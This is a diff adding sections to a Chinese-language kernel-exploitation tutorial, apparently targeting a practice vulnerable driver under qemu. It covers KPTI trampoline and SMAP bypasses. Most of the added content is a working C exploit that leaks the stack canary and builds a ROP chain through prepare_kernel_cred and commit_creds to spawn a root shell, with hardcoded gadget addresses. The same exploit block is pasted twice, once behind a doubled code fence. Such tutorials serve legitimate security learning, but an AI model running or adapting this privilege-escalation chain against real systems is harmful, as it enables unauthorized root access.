@@ -12,6 +12,9 @@ comments: true
   - [6.1 kpti的原理](#61-kpti的原理)
   - [6.2 设置signal handler + ROP 绕过](#62-设置signal-handler--rop-绕过)
   - [6.3 KPTI trampoline + ROP](#63-kpti-trampoline--rop)
+- [7. canary+smep+kpti+smap: ROP](#7-canarysmepkptismap-rop)
+  - [7.1 SMAP原理](#71-smap原理)
+  - [7.2 KPTI trampoline + ROP](#72-kpti-trampoline--rop)
 - [references](#references)
 
 
@@ -142,6 +145,161 @@ int main(){
 
 ## 6.3 KPTI trampoline + ROP<br>
 绕过方法其实还是ROP，但是因为需要切换页表，我们不知道切换页表要做什么，但是考虑到执行syscall能正常返回，内核里一定有一段关于内核页表切换的代码！<br>
+代码位于`swapgs_restore_regs_and_return_to_usermode`中<br>
+```bash
+cat /proc/kallsyms | grep swapgs_restore_regs_and_return_to_usermode
+ffffffff81200f10 T swapgs_restore_regs_and_return_to_usermode
+```
+其汇编代码如下:<br>
+```asm
+   0xffffffff81200f10 <_stext+2101008>:	pop    r15
+   0xffffffff81200f12 <_stext+2101010>:	pop    r14
+   0xffffffff81200f14 <_stext+2101012>:	pop    r13
+   0xffffffff81200f16 <_stext+2101014>:	pop    r12
+   0xffffffff81200f18 <_stext+2101016>:	pop    rbp
+   0xffffffff81200f19 <_stext+2101017>:	pop    rbx
+   0xffffffff81200f1a <_stext+2101018>:	pop    r11
+   0xffffffff81200f1c <_stext+2101020>:	pop    r10
+   0xffffffff81200f1e <_stext+2101022>:	pop    r9
+   0xffffffff81200f20 <_stext+2101024>:	pop    r8
+   0xffffffff81200f22 <_stext+2101026>:	pop    rax
+   0xffffffff81200f23 <_stext+2101027>:	pop    rcx
+   0xffffffff81200f24 <_stext+2101028>:	pop    rdx
+   0xffffffff81200f25 <_stext+2101029>:	pop    rsi
+   0xffffffff81200f26 <_stext+2101030>:	mov    rdi,rsp  //start here
+   0xffffffff81200f29 <_stext+2101033>:	mov    rsp,QWORD PTR gs:0x6004
+   0xffffffff81200f32 <_stext+2101042>:	push   QWORD PTR [rdi+0x30]
+   0xffffffff81200f35 <_stext+2101045>:	push   QWORD PTR [rdi+0x28]
+   0xffffffff81200f38 <_stext+2101048>:	push   QWORD PTR [rdi+0x20]
+   0xffffffff81200f3b <_stext+2101051>:	push   QWORD PTR [rdi+0x18]
+   0xffffffff81200f3e <_stext+2101054>:	push   QWORD PTR [rdi+0x10]
+   0xffffffff81200f41 <_stext+2101057>:	push   QWORD PTR [rdi]
+   0xffffffff81200f43 <_stext+2101059>:	push   rax
+   0xffffffff81200f44 <_stext+2101060>:	xchg   ax,ax
+   0xffffffff81200f46 <_stext+2101062>:	mov    rdi,cr3
+   0xffffffff81200f49 <_stext+2101065>:	jmp    0xffffffff81200f7f <_stext+2101119>
+   ... 
+   0xffffffff81200f7f <_stext+2101119>:	or     rdi,0x1000
+   0xffffffff81200f86 <_stext+2101126>:	mov    cr3,rdi
+   0xffffffff81200f89 <_stext+2101129>:	pop    rax
+   0xffffffff81200f8a <_stext+2101130>:	pop    rdi
+   0xffffffff81200f8b <_stext+2101131>:	swapgs
+   0xffffffff81200f8e <_stext+2101134>:	nop    DWORD PTR [rax]
+   0xffffffff81200f91 <_stext+2101137>:	jmp    0xffffffff81200fc0 <_stext+2101184>
+   ...
+   0xffffffff81200fc0 <_stext+2101184>:	test   BYTE PTR [rsp+0x20],0x4
+   0xffffffff81200fc5 <_stext+2101189>:	jne    0xffffffff81200fc9 <_stext+2101193>
+   0xffffffff81200fc7 <_stext+2101191>:	iretq  //这里返回
+```
+而且 `trampoline`里自带了`swapgs`和`iretq`，还是比较方便的。<br>
+```c
+unsigned long pop_rdi_ret = 0xffffffff81006370;
+unsigned long cmp_esi_esi_ret = 0xffffffff81906934;
+unsigned long mov_rdi_rax_ja_pop_rbp_ret = 0xffffffff818c6ebd;
+unsigned long swapgs_pop_rbp_ret = 0xffffffff8100a55f;
+unsigned long iretq = 0xffffffff8100c0d9;
+unsigned long swapgs_restore_regs_and_return_to_usermode = 0xffffffff81200f10+22;
+int main(){
+    // step 0 : save status
+    save_status();
+
+    int fd =open_device();
+    // step 1: leak the canary
+    unsigned long tmp_buf[50];
+    unsigned long size=0x8*50;
+    read(fd,tmp_buf,size);
+    unsigned long canary = tmp_buf[16];
+    printf("canary: 0x%llx\n",canary);
+
+    // step 2: construct the payload
+    int off = 17;
+    tmp_buf[off++] = 0;
+    tmp_buf[off++] = 0;
+    tmp_buf[off++] = 0;
+    tmp_buf[off++] = pop_rdi_ret;
+    tmp_buf[off++] = 0;
+    tmp_buf[off++] = prepare_kernel_cred;
+    tmp_buf[off++] = cmp_esi_esi_ret;
+    tmp_buf[off++] = mov_rdi_rax_ja_pop_rbp_ret;
+    tmp_buf[off++] = 0 ;
+    tmp_buf[off++] = commit_creds;
+    tmp_buf[off++] = swapgs_restore_regs_and_return_to_usermode;
+    tmp_buf[off++] = 0;  // padding
+    tmp_buf[off++] = 0;  //padding
+    tmp_buf[off++] = (unsigned long )get_root_shell;
+    tmp_buf[off++] = user_cs;
+    tmp_buf[off++] = user_rflags;
+    tmp_buf[off++] = user_sp;
+    tmp_buf[off++] = user_ss;
+    write(fd,tmp_buf,size);   
+}
+```
+
+# 7. canary+smep+kpti+smap: ROP<br>
+## 7.1 SMAP原理<br>
+SMAP本质上和SMEP类似，就是在**内核态时，用户态页表会被标记为不可读写。**<br>
+可以通过设置内核的`CR(control register)4寄存器的第21位bit为1`来启动该特性。就在SMEP标志位的旁边<br>
+qemu启动命令:<br>
+```
+#!/bin/sh
+qemu-system-x86_64 \
+    -m 128M \
+    -cpu kvm64,+smep,+smap \
+    -kernel bzImage \
+    -initrd initramfs.cpio.gz \
+    -snapshot \
+    -nographic \
+    -monitor /dev/null \
+    -no-reboot \
+    -append "console=ttyS0 nokaslr kpti=1 quiet panic=1" \
+    -s
+```
+## 7.2 KPTI trampoline + ROP<br>
+原先的代码原封不动就能用:<br>
+```c
+```c
+unsigned long pop_rdi_ret = 0xffffffff81006370;
+unsigned long cmp_esi_esi_ret = 0xffffffff81906934;
+unsigned long mov_rdi_rax_ja_pop_rbp_ret = 0xffffffff818c6ebd;
+unsigned long swapgs_pop_rbp_ret = 0xffffffff8100a55f;
+unsigned long iretq = 0xffffffff8100c0d9;
+unsigned long swapgs_restore_regs_and_return_to_usermode = 0xffffffff81200f10+22;
+int main(){
+    // step 0 : save status
+    save_status();
+
+    int fd =open_device();
+    // step 1: leak the canary
+    unsigned long tmp_buf[50];
+    unsigned long size=0x8*50;
+    read(fd,tmp_buf,size);
+    unsigned long canary = tmp_buf[16];
+    printf("canary: 0x%llx\n",canary);
+
+    // step 2: construct the payload
+    int off = 17;
+    tmp_buf[off++] = 0;
+    tmp_buf[off++] = 0;
+    tmp_buf[off++] = 0;
+    tmp_buf[off++] = pop_rdi_ret;
+    tmp_buf[off++] = 0;
+    tmp_buf[off++] = prepare_kernel_cred;
+    tmp_buf[off++] = cmp_esi_esi_ret;
+    tmp_buf[off++] = mov_rdi_rax_ja_pop_rbp_ret;
+    tmp_buf[off++] = 0 ;
+    tmp_buf[off++] = commit_creds;
+    tmp_buf[off++] = swapgs_restore_regs_and_return_to_usermode;
+    tmp_buf[off++] = 0;  // padding
+    tmp_buf[off++] = 0;  //padding
+    tmp_buf[off++] = (unsigned long )get_root_shell;
+    tmp_buf[off++] = user_cs;
+    tmp_buf[off++] = user_rflags;
+    tmp_buf[off++] = user_sp;
+    tmp_buf[off++] = user_ss;
+    write(fd,tmp_buf,size);   
+}
+```
+但是原本更复杂场景，栈迁移的技术就不可用了。<br>
 
 
 
